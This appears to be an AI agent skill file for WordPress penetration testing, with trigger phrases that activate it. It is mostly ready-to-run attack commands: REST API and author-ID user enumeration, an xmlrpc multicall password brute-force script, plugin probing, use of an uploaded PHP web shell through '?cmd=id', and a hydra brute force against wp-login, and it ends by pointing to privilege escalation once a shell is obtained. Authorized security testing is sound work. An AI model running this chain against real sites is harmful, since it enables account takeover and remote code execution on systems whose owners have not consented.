---
name: framework-wordpress
description: "WordPress security testing — user enumeration, xmlrpc.php abuse, plugin/theme CVEs, REST API exposure, WP-JSON, admin upload RCE, credential brute force. Triggers: 'wordpress', 'wp', 'wordpress security', 'xmlrpc', 'wpscan', 'wp plugin vuln'."
---

# WordPress Security Testing

Full WordPress penetration testing from enumeration to admin RCE.

## Phase 1: Enumeration

```bash
TARGET="https://TARGET"

wpscan --url "${TARGET}" --enumerate u,p,t,vp,vt --api-token "${WPSCAN_TOKEN}" -o /workspace/output/wpscan.txt

curl -s "${TARGET}/wp-json/wp/v2/users" | jq '.[].slug'
curl -s "${TARGET}/?rest_route=/wp/v2/users" | jq '.[].slug'

for i in 1 2 3 4 5; do
  curl -s -o /dev/null -w "%{redirect_url}" "${TARGET}/?author=${i}"
done
```

## Phase 2: xmlrpc.php Abuse

```bash
curl -s "${TARGET}/xmlrpc.php" -d '<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'

python3 -c "
import requests
target = '${TARGET}'
users = ['admin', 'editor', 'administrator']
passwords = open('/usr/share/wordlists/rockyou.txt').read().splitlines()[:100]
for user in users:
    calls = ''.join([f'<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{user}</string></value><value><string>{p}</string></value></data></array></value></data></array></value></member></struct></value>' for p in passwords[:50]])
    payload = f'<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>{calls}</data></array></value></param></params></methodCall>'
    r = requests.post(f'{target}/xmlrpc.php', data=payload)
    if 'isAdmin' in r.text:
        print(f'[+] Valid credential found for {user}')
"
```

## Phase 3: Plugin/Theme CVE Check

```bash
curl -s "${TARGET}" | grep -oP 'plugins/[^/]+' | sort -u

wpscan --url "${TARGET}" --plugins-detection aggressive \
  --api-token "${WPSCAN_TOKEN}" --format json -o /workspace/output/wpscan-vulns.json

for plugin in contact-form-7 woocommerce elementor revslider wpforms; do
  curl -s -o /dev/null -w "%{http_code} ${plugin}\n" "${TARGET}/wp-content/plugins/${plugin}/readme.txt"
done
```

## Phase 4: Admin Access to RCE

```bash
zip /tmp/evil.zip /tmp/evil.php  # evil.php contains the shell

curl "${TARGET}/wp-content/plugins/evil/evil.php?cmd=id"
curl "${TARGET}/wp-content/themes/THEME/404.php?cmd=id"
```

## Phase 5: WP-Login Brute Force

```bash
hydra -L /workspace/output/wp-users.txt -P /usr/share/wordlists/rockyou.txt \
  "${TARGET}" http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR"
```

## Output

Save to `/workspace/output/`:
- `wpscan.txt` — full enumeration
- `wpscan-vulns.json` — vulnerability findings
- `wp-rce.txt` — shell URL and proof

## Next Phase

→ `vuln-file-upload` for upload bypass
→ `post-linux-privesc` after shell obtained
